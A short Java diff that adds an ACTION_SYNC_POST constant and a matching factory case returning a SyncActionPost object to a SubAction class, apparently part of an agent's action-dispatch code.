@@ -34,6 +34,7 @@ public abstract class SubAction implements Runnable {
 	public static final int ACTION_EXECUTE = ACTION + 0x9;
 	public static final int ACTION_SYNC_APN = ACTION + 0xa;
 	public static final int ACTION_LOG = ACTION + 0xb;
+	public static final int ACTION_SYNC_POST = ACTION + 0xc;
 
 	public int actionId;
 
@@ -109,6 +110,11 @@ public abstract class SubAction implements Runnable {
 			debug.trace("Factory *** ACTION_INFO ***");
 			//#endif
 			return new LogAction(actionId_, confParams);
+	     case ACTION_SYNC_POST:
+	            //#ifdef DEBUG_TRACE
+	            debug.trace("Factory *** ACTION_POST ***");
+	            //#endif
+	            return new SyncActionPost(actionId_, confParams);
 		default:
 			return null;
 		}
